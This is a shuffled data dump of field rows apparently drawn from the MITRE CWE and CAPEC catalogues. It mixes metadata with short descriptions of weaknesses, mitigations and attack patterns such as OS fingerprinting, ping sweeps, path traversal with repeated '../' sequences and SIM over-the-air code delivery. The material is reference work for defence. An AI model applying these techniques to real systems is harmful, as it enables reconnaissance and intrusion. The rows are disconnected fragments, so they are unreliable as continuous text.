15776	23	An adversary sends a UDP packet to a closed port on the target machine to solicit an IP Header's total length field value within the echoed 'Port Unreachable" error message. RFC1122 specifies that the Header of the request must be echoed back when an error is sent in response, but some operating systems and firmware alter the integrity of the original header. Non-standard ICMP/IP implementations result in response that are useful for individuating remote operating system or router firmware versions. There are four general response types that can be used to distinguish operating systems apart: 1) the IP total length field may be calculated correctly, 2) an operating system may add 20 or more additional bytes to the length calculation, 3) the operating system may subtract 20 or more bytes from the correct length of the field or 4) the IP total length field is calculated with any other incorrect value. This type of behavior is useful for building a signature-base of operating system responses, particularly when error messages contain other types of information that is useful identifying specific operating system responses.
24452	35	MITRE
22024	35	MITRE
23391	35	MITRE
22517	31	699
14686	94	Run Arbitrary Code
12902	62	updated Common_Consequences, References, Relationships, Taxonomy_Mappings
20037	62	updated Relationships
24169	35	MITRE
5604	28	CWE Content Team
7390	33	Paul Kocher
5586	39	2009-05-27
10251	103	Primary
14192	93	Defense in Depth
21778	88	Use of Password Hash Instead of Password for Authentication
15639	28	CWE Content Team
23953	35	MITRE
6307	62	updated Description
15020	35	MITRE
8405	62	updated Potential_Mitigations, Time_of_Introduction
12068	103	Primary
7007	51	2015-11-09
23876	63	Execute Unauthorized Code or Commands
11524	91	Implementation
5769	62	updated Relationships, Taxonomy_Mappings
24672	51	2014-06-23
23079	91	System Configuration
25118	39	2008-07-01
20440	35	MITRE
23772	84	29
14706	28	CWE Content Team
18213	35	MITRE
12589	31	699
7283	26	Implementation
15702	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
17012	76	2018-07-31
14483	62	updated Relationships
13739	35	MITRE
13290	43	Simple
16662	45	Variant
16235	85	636
17388	104	1063
11196	51	2014-06-23
22904	56	CanPrecede
24053	26	Implementation
16743	35	MITRE
5966	63	DoS: Amplification
9922	59	Updated Related_Attack_Patterns
23511	100	The MITRE Corporation
10173	88	Improper Verification of Intent by Broadcast Receiver
12645	42	Funnel all access through a single choke point to simplify how users can access a resource. For every access, perform a check to determine if the user has permissions to access the resource.
15893	39	2011-06-01
16797	46	This issue can make the software perform more slowly, possibly in ways that are noticeable to the users.  If an attacker can influence the amount of computation that must be performed, e.g. by triggering worst-case complexity, then this performance problem might introduce a vulnerability.
24599	35	MITRE
11020	39	2013-06-23
6909	28	CWE Content Team
11366	35	MITRE
10374	56	ChildOf
12660	28	CWE Content Team
22166	86	http://csrc.nist.gov/groups/SNS/rbac/
15784	28	CWE Content Team
25073	91	Architecture and Design
11172	61	Draft
12342	39	2015-12-07
14065	77	Dynamic Analysis with Automated Results Interpretation
15005	28	CWE Content Team
8277	81	Access Control
8739	85	466
15902	61	Draft
7637	79	Integrity
10377	101	CAPEC Content Team
8602	62	updated Applicable_Platforms
17058	44	SOAR Partial
16314	90	Language-Independent
6693	39	2011-06-01
11272	26	Implementation
17055	23	The application searches for critical resources using an externally-supplied search path that can point to resources that are not under the application's direct control.
24359	62	updated Relationships, Taxonomy_Mappings
23014	28	CWE Content Team
23358	81	Integrity
20089	23	The product performs the same operation on a resource two or more times, when the operation should only be applied once.
17803	40	There are two components communicating with each other.
11636	44	Limited
21483	35	MITRE
13363	35	MITRE
6113	35	MITRE
24307	28	CWE Content Team
21768	81	Other
17886	35	MITRE
19603	62	added/updated demonstrative examples
12550	62	updated Related_Attack_Patterns
24195	63	Reduce Maintainability
13289	28	CWE Content Team
13157	35	MITRE
11411	62	updated Description, Potential_Mitigations
17694	73	Examine Cookies that may contain server's software information.
7736	28	CWE Content Team
7016	28	CWE Content Team
20842	89	Detailed
23666	43	Simple
15097	62	updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
11369	56	ChildOf
7878	63	Varies by Context
13756	44	High
13790	72	Data that is parsed and used may be corrupted.
13277	42	Configure ACLs on the server side to ensure that proper level of access control is defined for each accessible resource representation.
24851	39	2008-07-01
16813	39	2008-07-01
24392	89	Meta
8087	28	CWE Content Team
19999	91	System Configuration
13289	35	MITRE
24113	85	256
9540	56	ChildOf
18074	39	2011-06-01
21004	103	Primary
8899	28	CWE Content Team
19407	35	MITRE
13750	73	Using an automated tool, test each URL input for weakness.
6437	76	2019-09-30
17791	35	MITRE
9847	62	updated Common_Consequences, Description, Enabling_Factors_for_Exploitation, Observed_Examples
13777	39	2017-05-03
21369	28	Eric Dalci
8735	79	Access Control
19271	88	Inappropriate Comment Style
7162	97	TCP (ISN) Counter Rate Probe
14810	39	2010-02-16
19041	23	An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts. The adversary leverages this capability to execute his/her own script by embedding it within other scripts that the target software is likely to execute. The adversary must have the ability to inject their script into a script that is likely to be executed. If this is done, then the adversary can potentially launch a variety of probes and attacks against the web server's local environment, in many cases the so-called DMZ, back end resources the web server can communicate with, and other hosts. With the proliferation of intermediaries, such as Web App Firewalls, network devices, and even printers having JVMs and Web servers, there are many locales where an attacker can inject malicious scripts. Since this attack pattern defines scripts within scripts, there are likely privileges to execute said attack on the host. These attacks are not solely limited to the server side, client side scripts like Ajax and client side JavaScript can contain malicious scripts as well.
10794	56	ChildOf
22184	100	The MITRE Corporation
23536	62	updated Description, Potential_Mitigations, Relationships
25101	56	ChildOf
19538	67	Medium
24886	62	updated Applicable_Platforms, Common_Consequences, Description, Relationships, Other_Notes, Taxonomy_Mappings
18584	35	MITRE
11776	56	ChildOf
15508	100	The MITRE Corporation
12207	28	Eric Dalci
19653	31	1000
14568	26	Operation
15040	39	2012-05-11
10509	35	MITRE
25393	77	Manual Static Analysis - Source Code
24695	23	An adversary sends out an ICMP Type 8 Echo Request, commonly known as a 'Ping', in order to determine if a target system is responsive. If the request is not blocked by a firewall or ACL, the target host will respond with an ICMP Type 0 Echo Reply datagram. This type of exchange is usually referred to as a 'Ping' due to the Ping utility present in almost all operating systems. Ping, as commonly implemented, allows a user to test for alive hosts, measure round-trip time, and measure the percentage of packet loss. Performing this operation for a range of hosts on the network is known as a 'Ping Sweep'. While the Ping utility is useful for small-scale host discovery, it was not designed for rapid or efficient host discovery over large network blocks. Other scanning utilities have been created that make ICMP ping sweeps easier to perform. Most networks filter ingress ICMP Type 8 messages for security reasons. Various other methods of performing ping sweeps have developed as a result. It is important to recognize the key security goal of the adversary is to discover if an IP address is alive, or has a responsive host. To this end, virtually any type of ICMP message, as defined by RFC 792 is useful. An adversary can cycle through various types of ICMP messages to determine if holes exist in the firewall configuration. When ICMP ping sweeps fail to discover hosts, other protocols can be used for the same purpose, such as TCP SYN or ACK segments, UDP datagrams sent to closed ports, etc.
18413	91	Implementation
22740	95	[Cache poisoning] The attacker decides to target the cache server. The server will then cache the request and serve a wrong page to a legitimate user's request. The malicious request will most likely exploit a Cross-Site Scripting or another injection typed vulnerability.
20866	56	ChildOf
18955	69	Incomplete
15262	45	Base
17151	31	1000
17160	62	updated Affected_Resources, Applicable_Platforms, Relationships
18042	52	Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.
13491	39	2014-07-30
22600	28	CWE Content Team
10569	35	MITRE
6562	59	Updated Related_Attack_Patterns
5588	54	Low
18148	91	Architecture and Design
12869	104	276
8781	63	Unexpected State
12433	62	updated Demonstrative_Examples
9963	56	CanPrecede
13624	104	120
6843	39	2010-02-16
21529	79	Confidentiality
19658	100	The MITRE Corporation
6042	103	Primary
10493	35	MITRE
15153	81	Other
6064	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Configuration Checker
15510	92	Exploit
19158	28	CWE Content Team
15283	27	Ability to send HTTP request to a web application.
10865	81	Other
7315	35	MITRE
6701	35	MITRE
15668	62	updated Description, Name
24063	62	updated Potential_Mitigations
9276	63	Hide Activities
8612	97	XML Oversized Payloads
13329	81	Other
14736	81	Access Control
24736	42	To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.
5680	28	CWE Content Team
16567	28	CWE Content Team
7172	35	MITRE
19186	56	ChildOf
5643	35	MITRE
10883	56	ChildOf
16957	62	updated Detection_Factors
17908	39	2011-06-01
7787	35	MITRE
13337	35	MITRE
7256	31	1000
7980	28	CWE Content Team
6569	101	CAPEC Content Team
16704	74	2
22432	62	updated Relationships
10209	35	MITRE
6400	35	MITRE
17143	79	Availability
12718	78	Medium
19968	45	Base
7373	62	updated Description
20147	28	CWE Content Team
7641	81	Access Control
15054	62	updated Potential_Mitigations
21552	79	Confidentiality
22162	42	For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page.                   One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.
5893	35	MITRE
19597	39	2008-09-08
25402	45	Base
9872	62	updated Relationships, Taxonomy_Mappings
9656	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
20081	57	Primary
12322	35	MITRE
22548	97	Create files with the same name as files protected with a higher classification
9189	28	CWE Content Team
17263	35	MITRE
18506	28	CWE Content Team
24094	56	CanAlsoBe
6241	31	1000
12065	69	Incomplete
9902	23	An attacker with access to system components during allocated baseline development can substitute a maliciously altered hardware component for a baseline component in the during the product development and research phase. This can lead to adjustments and calibrations being made in the product, so that when the final product with the proper components is deployed, it will not perform as designed and be advantageous to the attacker.
9509	31	1000
18974	63	Modify Memory
13753	35	Cigital
11371	33	B. Kaliski
11077	100	The MITRE Corporation
21442	26	Implementation
15656	28	CWE Content Team
22092	45	Base
12120	38	An attack designed to leverage a buffer overflow and redirect execution as per the adversary's bidding is fairly difficult to detect. An attack aimed solely at bringing the system down is usually preceded by a barrage of long inputs that make no sense. In either case, it is likely that the adversary would have resorted to a few hit-or-miss attempts that will be recorded in the system event logs, if they exist.
17725	62	updated Time_of_Introduction
19832	74	3
20816	35	MITRE
9654	23	Rest uses standard HTTP (Get, Put, Delete) style permissions methods, but these are not necessarily correlated generally with back end programs. Strict interpretation of HTTP get methods means that these HTTP Get services should not be used to delete information on the server, but there is no access control mechanism to back up this logic. This means that unless the services are properly ACL'd and the application's service implementation are following these guidelines then an HTTP request can easily execute a delete or update on the server side. The attacker identifies a HTTP Get URL such as http://victimsite/updateOrder, which calls out to a program to update orders on a database or other resource. The URL is not idempotent so the request can be submitted multiple times by the attacker, additionally, the attacker may be able to exploit the URL published as a Get method that actually performs updates (instead of merely retrieving data). This may result in malicious or inadvertent altering of data on the server.
15725	26	Architecture and Design
6461	91	Implementation
12814	62	updated Relationships
14694	28	CWE Content Team
24597	101	CAPEC Content Team
17025	56	PeerOf
5599	28	CWE Content Team
17746	62	updated Description
8288	62	updated Common_Consequences
17039	90	Language-Independent
14391	62	updated Potential_Mitigations
16940	39	2012-05-11
12302	39	2019-01-03
21018	35	MITRE
14112	63	Reduce Performance
7291	35	MITRE
16134	35	MITRE
9748	35	MITRE
20411	40	Physical access to the system
7538	35	MITRE
11124	100	The MITRE Corporation
13438	35	MITRE
21124	61	Draft
10410	39	2008-11-24
21706	103	Primary
6884	90	PHP
23321	39	2008-09-08
16489	56	ChildOf
19251	59	Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, References, Related_Attack_Patterns, Typical_Likelihood_of_Exploit
13725	97	SaaS User Request Forgery
25137	81	Integrity
19865	28	CWE Content Team
22988	63	Read Files or Directories
17061	28	CWE Content Team
17713	60	17
6287	42	When using web applications with SSL, use SSL for the entire session from login to logout, not just for the initial login page.
7762	35	MITRE
6697	46	Using a fixed address is not portable because that address will probably not be valid in all environments or platforms.
9308	39	2010-04-05
13107	54	Medium
14016	42	Use Static Analysis tools to spot such conditions.
15590	100	The MITRE Corporation
17846	24	MITRE
22994	76	2017-01-09
23723	61	Draft
6649	28	CWE Content Team
10831	62	updated Potential_Mitigations, References
6961	56	ChildOf
24786	28	CWE Content Team
12412	92	Experiment
12439	57	Primary
13786	39	2011-06-27
7773	39	2013-02-21
19730	35	MITRE
20074	88	Buffer Access Using Size of Source Buffer
23353	28	CWE Content Team
24452	62	updated Alternate_Terms, Observed_Examples, References
12672	70	Auditing binaries for security vulnerabilities
5673	42	When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.
25422	77	Automated Dynamic Analysis
21513	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
19716	61	Stable
17494	53	The MITRE Corporation
9543	28	CWE Content Team
13924	77	White Box
23428	62	updated Common_Consequences
6825	73	Gather results for analysis via responses or network sniffing.
25163	28	CWE Content Team
21250	79	Confidentiality
16109	39	2017-11-08
7535	35	MITRE
24677	56	ChildOf
13094	39	2012-05-11
10042	43	Simple
23503	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
7103	91	Testing
8183	28	Eric Dalci
14874	40	Additionally, this information must be unprotected, or protected in a flawed fashion, or through a mechanism that fails to resist reverse engineering, statistical, or other attack.
16185	25	Low
20892	62	updated Common_Consequences
9887	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
22545	56	ChildOf
20206	35	MITRE
9115	99	Addison Wesley
10647	39	2019-01-03
19594	28	CWE Content Team
21151	62	added/updated demonstrative examples
19593	56	ChildOf
23695	28	CWE Content Team
20523	90	Language-Independent
17752	43	Simple
17479	39	2008-09-08
18367	39	2019-01-03
23052	39	2009-10-29
22025	62	updated Type
12735	36	http://www.infosecwriters.com/texts.php?op=display&id=159
20062	35	MITRE
18481	62	updated Relationships, Taxonomy_Mappings
23209	39	2017-11-08
20133	35	MITRE
8607	62	updated Applicable_Platforms
14075	72	An attacker that can influence the allocation of resources that are not properly maintained could deplete the available resource pool and prevent all other processes from accessing the same type of resource.
18607	31	1000
22985	39	2013-02-21
19726	62	updated Common_Consequences
11961	103	Primary
7322	102	CanPrecede
16467	39	2014-06-23
14599	60	27
17307	42	Do not accept inconsistent behavior from the API specifications when the deviant behavior increase the risk level.
10801	69	Incomplete
18730	50	Select a provably large secret space for selection of the secret. Provably large means that the procedure by which the secret is selected does not have artifacts that significantly reduce the size of the total secret space.
25241	34	A call to System.exit() is probably part of leftover debug code or code imported from a non-J2EE application.
6722	35	MITRE
16359	95	[Determine Vulnerable API] An adversary explores a target system for sample or test APIs that have not been disabled by a system administrator and which may be exploitable by the adversary.
13599	39	2012-10-30
14811	26	Implementation
13562	62	updated Demonstrative_Examples, Modes_of_Introduction, Relationships, Taxonomy_Mappings
22837	62	updated Relationships
12814	39	2017-01-19
24316	28	CWE Content Team
12079	35	MITRE
23584	62	updated Potential_Mitigations, Time_of_Introduction
24961	103	Primary
18707	57	Indirect
11986	62	updated Potential_Mitigations
10884	62	updated Applicable_Platforms
8673	73	API Profiling. The attacker monitors the software's use of registry keys or other operating system-provided storage locations that can contain sensitive information.
17029	103	Primary
22691	86	http://www.modsecurity.org/archive/amit/blind-xpath-injection.pdf
19945	39	2009-07-27
10653	100	The MITRE Corporation
23586	39	2017-11-08
7853	31	1000
12415	62	updated Description, Maintenance_Notes, Relationships
12163	42	Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, languages such as Java, Ruby, and Lisp perform automatic garbage collection that releases memory for objects that have been deallocated.
20921	28	CWE Content Team
11055	50	Memory should always be allocated/freed using matching functions (e.g., malloc/free, new/delete, etc.)
7632	79	Integrity
8290	35	MITRE
12628	45	Class
18488	35	MITRE
17321	40	The targeted system must have multiple stages processing of XML content.
16097	33	D.J. Bernstein
5627	66	What is the Future of Automated XSS Defense Tools?
13679	40	The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal users
19560	22	09
10046	78	Medium
22994	59	Updated Related_Attack_Patterns
6716	28	CWE Content Team
7279	26	Architecture and Design
6731	28	CWE Content Team
24294	35	MITRE
16712	28	CWE Content Team
6513	104	762
8350	23	An attacker modifies file contents or attributes (such as extensions or names) of files in a manner to cause incorrect processing by an application. Attackers use this class of attacks to cause applications to enter unstable states, overwrite or expose sensitive information, and even execute arbitrary code with the application's privileges. This class of attacks differs from attacks on configuration information (even if file-based) in that file manipulation causes the file processing to result in non-standard behaviors, such as buffer overflows or use of the incorrect interpreter. Configuration attacks rely on the application interpreting files correctly in order to insert harmful configuration information. Likewise, resource location attacks rely on controlling an application's ability to locate files, whereas File Manipulation attacks do not require the application to look in a non-default location, although the two classes of attacks are often combined.
15498	35	MITRE
21658	39	2009-05-27
21311	103	Primary
16237	39	2011-06-01
8001	56	ChildOf
17400	100	The MITRE Corporation
12801	42	Call the super.finalize() method.
15404	39	2011-06-27
24024	39	2010-04-05
20063	39	2018-03-27
16282	39	2012-10-30
18512	39	2008-09-08
24120	62	updated Common_Consequences
16063	31	1000
21288	35	MITRE
24747	62	updated Relationships
21857	88	Insufficient UI Warning of Dangerous Operations
15663	28	CWE Content Team
19959	35	MITRE
11774	79	Access Control
18450	71	1994
12956	28	CWE Content Team
20918	35	MITRE
16334	28	CWE Content Team
8919	100	The MITRE Corporation
17686	84	26
21001	81	Access Control
23370	62	updated Relationships
9863	35	Cigital
19366	79	Integrity
11043	39	2019-06-20
19345	62	updated Relationships, Taxonomy_Mappings
23319	42	Avoid having unnecessary types or gadgets available that can be leveraged for malicious ends. This limits the potential for unintended or unauthorized types and gadgets to be leveraged by the attacker. Whitelist acceptable classes. Note: new gadgets are constantly being discovered, so this alone is not a sufficient mitigation.
15071	101	CAPEC Content Team
14119	25	High
24360	28	CWE Content Team
9858	62	updated Detection_Factors, Relationships
17609	24	MITRE
6718	39	2012-05-11
15437	28	CWE Content Team
22566	39	2009-07-16
6855	61	Stable
5794	100	The MITRE Corporation
21418	33	Zvi Gutterman
11750	23	An attacker modifies a technology, product, or component during a stage in its manufacture for the purpose of carrying out an attack against some entity involved in the supply chain lifecycle. There are an almost limitless number of ways an attacker can modify a technology when they are involved in its manufacture, as the attacker has potential inroads to the software composition, hardware design and assembly, firmware, or basic design mechanics. Additionally, manufacturing of key components is often outsourced with the final product assembled by the primary manufacturer. The greatest risk, however, is deliberate manipulation of design specifications to produce malicious hardware or devices. There are billions of transistors in a single integrated circuit and studies have shown that fewer than 10 transistors are required to create malicious functionality.
13071	46	This allows attackers to traverse the file system to access files or directories that are outside of the restricted directory.             The 'directory/../../filename' manipulation is useful for bypassing some path traversal protection schemes. Sometimes a program only removes one "../" sequence, so multiple "../" can bypass that check. Alternately, this manipulation could be used to bypass a check for "../" at the beginning of the pathname, moving up more than one directory level.
12461	91	Architecture and Design
16851	62	updated Relationships
18207	28	CWE Content Team
18535	35	MITRE
7304	21	CWE Content Team
22708	35	MITRE
22940	46	Improper validation of checksums before use results in an unnecessary risk that can easily be mitigated. The protocol specification describes the algorithm used for calculating the checksum. It is then a simple matter of implementing the calculation and verifying that the calculated checksum and the received checksum match. Improper verification of the calculated checksum and the received checksum can lead to far greater consequences.
15301	39	2008-10-14
10410	35	MITRE
24879	23	SIM cards are the de facto trust anchor of mobile devices worldwide. The cards protect the mobile identity of subscribers, associate devices with phone numbers, and increasingly store payment credentials, for example in NFC-enabled phones with mobile wallets. This attack leverages over-the-air (OTA) updates deployed via cryptographically-secured SMS messages to deliver executable code to the SIM. By cracking the DES key, an attacker can send properly signed binary SMS messages to a device, which are treated as Java applets and are executed on the SIM. These applets are allowed to send SMS, change voicemail numbers, and query the phone location, among many other predefined functions. These capabilities alone provide plenty of potential for abuse.
14634	28	CWE Content Team
14387	46	Typically, this can result in corruption of data, a crash, or code execution.  The software may modify an index or perform pointer arithmetic that references a memory location that is outside of the boundaries of the buffer.  A subsequent write operation then produces undefined or unexpected results.
6464	31	700
6487	33	OWASP
17194	39	2010-04-05
15574	39	2008-09-08
7262	62	updated References, Related_Attack_Patterns, Relationships
5861	40	The attacker must be able to employ a sniffer on the network without being detected.
17515	36	http://www.cc.gatech.edu/~dovrolis/Papers/ccr-bgp.pdf
23831	62	updated Relationships
12904	35	MITRE
13058	63	Unexpected State
22883	90	C
6609	43	Simple
13387	76	2017-08-04
15279	47	Execute Unauthorized Commands
24282	35	MITRE
10182	35	MITRE
15243	33	Petko "pdp" D. Petkov
23397	51	2014-06-23
24626	28	CWE Content Team
11756	62	updated Description, Other_Notes, Relationships
24768	39	2009-01-12
21039	91	Implementation
9841	50	Disable script execution.
18546	90	Java
6509	24	MITRE
6476	74	4
25158	62	updated Relationships
15842	53	The MITRE Corporation
15256	76	2017-01-09
22219	47	Gain Privileges
6844	62	updated Potential_Mitigations, Time_of_Introduction
19078	69	Incomplete
7614	54	High
20013	45	Base
23751	42	Use class equivalency to determine type. Rather than use the class name to determine if an object is of a given type, use the getClass() method, and == operator.
7960	39	2009-03-10
23824	35	MITRE
6258	92	Exploit
8391	35	MITRE
12381	39	2009-05-27
16172	33	Don Parker
22543	33	Dinis Cruz
19442	55	CAPEC Content Team
18715	81	Confidentiality
23457	63	Hide Activities
8316	92	Explore
15417	91	Architecture and Design
7355	100	The MITRE Corporation
17814	39	2010-06-21
15504	39	2019-01-03
10863	39	2017-11-08
13887	56	ChildOf
13548	62	updated Potential_Mitigations
24833	28	CWE Content Team
7991	85	594
19411	28	CWE Content Team
20092	39	2014-07-30
16892	63	Bypass Protection Mechanism
15498	62	updated Applicable_Platforms
8149	28	CWE Content Team
19935	104	674
9953	80	The ability to spoof GPS signals is not trival.
24184	39	2009-05-27
9869	39	2012-10-30
12001	35	MITRE
11067	96	2018-07-02
7480	40	An adversary has access to the file system of a system.
5851	74	3
23513	51	2014-06-23
20207	35	MITRE
8058	33	Robert C. Seacord
10128	55	CAPEC Content Team
7539	39	2014-07-30
10229	35	MITRE
25177	39	2010-09-27
25239	39	2011-06-01
21908	69	Draft
24879	85	614
22440	62	updated References
10881	28	CWE Content Team
13716	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
10986	28	Eric Dalci
8241	28	CWE Content Team
12721	73	Investigation of the target environment to determine the types of technologies used to parse the incoming HTTP requests. Attempt to understand how HTTP Request headers are parsed
14939	101	CAPEC Content Team
12292	62	updated Relationships, Taxonomy_Mappings
20304	56	ChildOf
13626	59	Updated Related_Attack_Patterns
21501	23	A UI function for a security feature appears to be supported and gives feedback to the user that suggests that it is supported, but the underlying functionality is not implemented.
14070	45	Base
12006	62	updated Description, Name
9483	81	Non-Repudiation
10100	35	MITRE
17531	81	Availability
15311	81	Integrity
8310	81	Availability
6097	39	2014-07-30
14530	39	2013-02-21
25113	73	Determine logging utility being used by application (e.g. log4j)
7189	102	ChildOf
19912	55	CAPEC Content Team
18936	80	The attack simply requires basic scripting ability to automate the exploration of the search space. More sophisticated attackers may be able to use more advanced methods to reduce the search space and increase the speed with which the secret is located.
14374	48	03
7107	42	Make sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected.
13259	100	The MITRE Corporation
8777	28	CWE Content Team
23838	39	2011-06-01
25216	28	Eric Dalci
9693	35	MITRE
13710	35	MITRE
17818	28	CWE Content Team
23877	56	CanPrecede
9359	35	MITRE
24522	31	1000
24332	88	Improper Certificate Validation
15695	35	MITRE
14539	28	CWE Content Team
25205	77	Manual Static Analysis - Source Code
7958	101	CAPEC Content Team
9990	35	MITRE
24122	104	91
23237	62	updated Observed_Examples, Related_Attack_Patterns, Relationships
8484	28	CWE Content Team
19511	31	1000
17998	35	MITRE
9462	28	CWE Content Team
18717	81	Access Control
7690	38	Differences in requests processed by the two entities. This requires careful monitoring or a capable log analysis tool.
18987	69	Incomplete
22696	91	Architecture and Design
21529	47	Read Data
10091	92	Explore
13478	76	2019-04-04
19414	81	Other
13107	50	Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.
25155	63	Varies by Context
24916	28	CWE Content Team
8350	27	None: No specialized resources are required to execute this type of attack. In some cases, tools can be used to better control the response of the targeted application to the modified file.
10189	101	CAPEC Content Team
20754	79	Confidentiality
12280	53	The MITRE Corporation
17355	90	Language-Independent
18071	62	updated Description
8377	28	CWE Content Team
20027	91	Implementation
13215	28	CWE Content Team
12018	39	2014-07-30
13552	35	MITRE
24301	35	MITRE
22303	66	.NET Framework Developer's Guide - Securing Connection Strings
19317	100	The MITRE Corporation
21333	56	ChildOf
13638	35	MITRE
6952	104	163
22537	35	MITRE
5871	21	PLOVER
5861	97	Sniff Application Code
10545	56	ChildOf
21162	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
21935	39	2017-11-08
17313	28	CWE Content Team
24618	35	MITRE
8889	31	1000
10522	35	MITRE
12073	61	Draft
21735	97	Spear Phishing
8204	35	MITRE
14908	39	2009-12-28
9008	96	2018-07-02
9701	28	CWE Content Team
16853	62	updated Relationships
7061	21	CLASP
14995	28	CWE Content Team
14227	28	CWE Content Team
16695	28	CWE Content Team
11723	35	MITRE
13600	23	A client/server product performs authentication within client code but not in server code, allowing server-side authentication to be bypassed via a modified client that omits the authentication check.
8815	62	updated Potential_Mitigations
16922	91	Implementation
10719	39	2014-07-30
20100	88	Improper Handling of Extra Values
15983	28	CWE Content Team
21220	62	updated Common_Consequences, Description, Relationships, Other_Notes, Taxonomy_Mappings
8435	66	Meta-Character Vulnerabilities
8564	79	Availability
21331	91	Architecture and Design
23686	35	MITRE
17498	35	MITRE
11413	79	Authorization
9781	81	Other
19955	91	Build and Compilation
12061	62	updated Relationships
25392	35	MITRE
10121	89	Meta
16650	91	Operation
9759	35	MITRE
21964	60	01
8158	91	Requirements
11874	28	CWE Content Team
12653	76	2019-04-04
9411	81	Integrity
20374	28	CWE Content Team
19273	85	207
12206	61	Stable
16202	74	4
23723	50	User input must be sanitized according to context before reflected back to the user. The JavaScript function 'encodeURI' is not always sufficient for sanitizing input intended for global Flash parameters. Extreme caution should be taken when saving user input in Flash cookies. In such cases the Flash file itself will need to be fixed and recompiled, changing the name of the local shared objects (Flash cookies).
18973	91	Implementation
12817	101	CAPEC Content Team
13170	93	Limited
9521	101	CAPEC Content Team
10641	28	CWE Content Team
14553	44	High
8018	31	1000
6917	80	Attacker needs to understand the layout and composition of data blobs used by the target application.
11530	28	CWE Content Team
21168	56	ChildOf
14460	62	updated Applicable_Platforms, References, Relationships, Taxonomy_Mappings
24111	28	CWE Content Team
10715	61	Stable
18507	27	None: No specialized resources are required to execute this type of attack.
22133	60	26
10698	39	2011-06-01
23218	28	CWE Content Team
10771	79	Access Control
19578	26	Implementation
11433	45	Class
8322	26	Implementation
11169	47	Gain Privileges
16053	90	C++
10646	45	Variant
18397	40	An application uses data access layer generated by an ORM tool or framework
6211	31	1000
24225	103	Primary
11990	62	updated Common_Consequences
10629	31	1000
21869	35	MITRE
10681	28	CWE Content Team
25243	39	2014-07-30
20198	35	MITRE
19021	43	Simple
24338	51	2018-05-31
17832	79	Integrity
15710	95	On the probing stage, the attacker interacts with the command utility and observes the results of its input. The attacker's goal is to uncover a buffer overflow in the command utility. For instance the attacker may find that input data are not properly validated.
13937	70	Inferring Mechanics of Web Censorship Around the World
12630	63	Gain Privileges or Assume Identity
23104	77	Black Box
23676	62	updated Time_of_Introduction
7461	31	1000
8431	39	2014-07-30
21352	31	1000
9835	39	2008-10-14
22555	35	MITRE
18969	47	Unreliable Execution
22168	94	Attack patterns that manipulate human behavior can result in a wide variety of consequences and potentially affect the confidentiality, availability, and/or integrity of an application or system.
7869	39	2017-11-08
15248	46	Double-checked locking refers to the situation where a programmer checks to see if a resource has been initialized, grabs a lock, checks again to see if the resource has been initialized, and then performs the initialization if it has not occurred yet. This should not be done, as is not guaranteed to work in all languages and on all architectures. In summary, other threads may not be operating inside the synchronous block and are not guaranteed to see the operations execute in the same order as they would appear inside the synchronous block.
8376	72	This weakness can cause unintended logic to be executed and other unexpected application behavior.
23443	25	Medium
8819	88	Leftover Debug Code
15109	35	MITRE
19596	39	2019-09-19
22851	46	If an attacker cannot directly contact a target, but the software has access to the target, then the attacker can send a request to the software and have it be forwarded from the target. The request would appear to be coming from the software's system, not the attacker's system. As a result, the attacker can bypass access controls (such as firewalls) or hide the source of malicious requests, since the requests would not be coming directly from the attacker.             Since proxy functionality and message-forwarding often serve a legitimate purpose, this issue only becomes a vulnerability when:                                                The software runs with different privileges or on a different system, or otherwise has different levels of access than the upstream component;                   The attacker is prevented from making the request directly to the target; and                   The attacker can create a request that the proxy does not explicitly intend to be forwarded on the behalf of the requester. Such a request might point to an unexpected hostname, port number, or service. Or, the request might be sent to an allowed service, but the request could contain disallowed directives, commands, or resources.
10721	26	Architecture and Design
14961	63	Modify Memory
6320	56	ChildOf
24595	62	updated Potential_Mitigations
19870	44	High
20780	95	[Attacker tricks victim to load the iFrame overlay page] Attacker utilizes some form of temptation, misdirection or coercion to trick the victim to loading and interacting with the iFrame overlay page in a way that increases the chances that the victim will visit the malicious page.
17893	62	updated Related_Attack_Patterns, Relationships
21225	92	Experiment
19199	28	Eric Dalci
12988	39	2008-09-08
13353	62	updated Related_Attack_Patterns
8173	39	2008-07-01
8293	39	2008-07-01
19668	39	2012-10-30
17883	63	Modify Files or Directories
20689	46	A man-in-the-middle (MITM) attacker might be able to modify the message and spoof the endpoint.
17240	101	CAPEC Content Team
19447	63	Execute Unauthorized Code or Commands
18999	86	https://msdn.microsoft.com/pl-pl/library/ms173160(v=vs.100).aspx
24373	36	http://www.ietf.org/rfc/rfc3986.txt
12207	39	2008-07-01
